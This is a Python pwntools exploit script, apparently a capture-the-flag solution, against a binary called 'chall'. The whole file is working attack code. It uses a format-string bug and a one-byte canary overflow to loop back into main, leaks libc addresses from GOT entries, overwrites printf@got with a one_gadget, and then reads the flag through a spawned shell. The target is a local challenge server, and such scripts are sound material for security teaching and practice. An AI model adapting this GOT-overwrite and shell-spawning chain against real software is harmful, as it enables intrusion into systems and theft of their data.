#!/usr/bin/python3
from pwn import *

elf = ELF("./chall")
libc = ELF("./libc6_2.36-0ubuntu4_amd64.so")
context.binary = elf

HOST = "127.0.0.1"
PORT = 9998

gs = """
# b *main
continue
"""

# context.log_level = "debug"


def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process(elf.path)


def main():
    global io
    io = start()

    # =-=-= STAGE 1: Infinite format strings & leaks =-=-=
    # There is 1 byte overflow so we can change stack canary,
    # which will call __stack_chk_fail, so why not overwrite it with main?
    payload_len = 3*16+8+1
    payload = f"%{(elf.sym.main) & 0xffff}c%10$hn|%11$s|%12$s|".encode()
    assert len(payload) <= 0x20
    payload = payload.ljust(0x20, b"A")  # 6-9
    payload += p64(elf.got.__stack_chk_fail)  # 10
    payload += p64(elf.got.read)  # 11
    payload += p64(elf.got.setvbuf)  # 12
    assert len(payload) <= payload_len
    payload = payload.ljust(payload_len, b"A")
    # io.sendafter(b"? ", payload)
    io.send(payload)

    # =-=-= STAGE 2: Get libc leaks =-=-=
    # Because libc is not given, we need libc leaks
    # which we can give to libc database (example: https://libc.rip)
    # to find the libc used by the remote server.
    # Then run patchelf / pwninit to attach the libc to our local binary.
    leaks = io.clean().split(b"|")
    read, setvbuf = u64(leaks[1].ljust(8, b"\x00")), u64(
        leaks[2].ljust(8, b"\x00"))
    log.info(f"read: {hex(read)}")
    log.info(f"setvbuf: {hex(setvbuf)}")

    libc.address = read - libc.sym.read
    log.info(f"libc: {hex(libc.address)}")

    # =-=-= STAGE 3: Overwrite printf@got -> one_gadget =-=-=
    # There is a printf call after the format string bug.
    # So, we can overwrite printf@got with one_gadget to get a shell.
    one_gadgets = [libc.address+offs for offs in [0x4e1d0, 0xe4159, 0xe41b3]]
    one_gadget = one_gadgets[1]
    log.info(f"one_gadget: {hex(one_gadget)}")
    log.info(f"printf: {hex(libc.sym.printf)}")

    write_vals = [one_gadget & 0xff, (one_gadget >> 8) & 0xffff]

    payload = f"%{write_vals[0]}c%10$hhn".encode()
    payload += f"%{write_vals[1]-write_vals[0]}c%11$hn".encode()
    # payload = f"%{one_gadget & 0xffffffff}c%10$n".encode()
    assert len(payload) <= 0x20
    payload = payload.ljust(0x20, b"A")  # 6-9
    payload += p64(elf.got.printf)  # 10
    payload += p64(elf.got.printf+1)  # 11
    io.sendline(payload)

    io.clean()

    # =-=-= STAGE 4: Profit =-=-=
    io.sendline("cat flag*")

    io.interactive()


if __name__ == "__main__":
    main()
